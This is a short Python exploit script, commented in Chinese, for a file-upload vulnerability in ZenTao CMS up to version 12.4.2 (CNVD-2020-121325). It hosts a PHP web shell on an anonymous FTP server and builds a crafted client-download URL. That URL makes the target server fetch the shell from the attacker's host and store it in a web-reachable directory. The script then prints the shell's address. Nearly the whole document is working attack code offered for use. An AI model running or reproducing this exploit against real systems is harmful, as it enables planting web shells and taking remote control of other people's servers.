# pip install pyftpdlib
# 复制 basic.PHp 到当前目录
# 禅道 zentao_cnvd_2020_121325
# 禅道CMS<=12.4.2 文件上传漏洞
from threading import Thread

my_server = b'ftp://192.168.50.161:2121/basic.PHp'
base = '192.168.127.129:49154/zentao'
host = 'http://' + base + '/client-download-1-%s-1.html'
shell = 'http://' + base + '/data/client/1/basic.PHp'

serve_path = "./"


def ftp():
    from pyftpdlib.authorizers import DummyAuthorizer
    from pyftpdlib.handlers import FTPHandler
    from pyftpdlib.servers import FTPServer
    authorizer = DummyAuthorizer()
    authorizer.add_anonymous(serve_path)
    handler = FTPHandler
    handler.authorizer = authorizer
    handler.passive_ports = range(2122, 2123)
    server = FTPServer(("0.0.0.0", 2121), handler)
    server.serve_forever()


def get_url():
    from base64 import b64encode
    surl = b64encode(my_server).decode()
    return host % surl


# ftp()

url = get_url()

print('1.开启服务器穿透到本机2121-2123')
print('2.访问url')
print(url)
print('shell:', shell)

t1_ftp = Thread(target=ftp, name="t1")
t1_ftp.start()

# res = requests.get(url)
# print(res.text)
import webbrowser

# webbrowser.open(url)
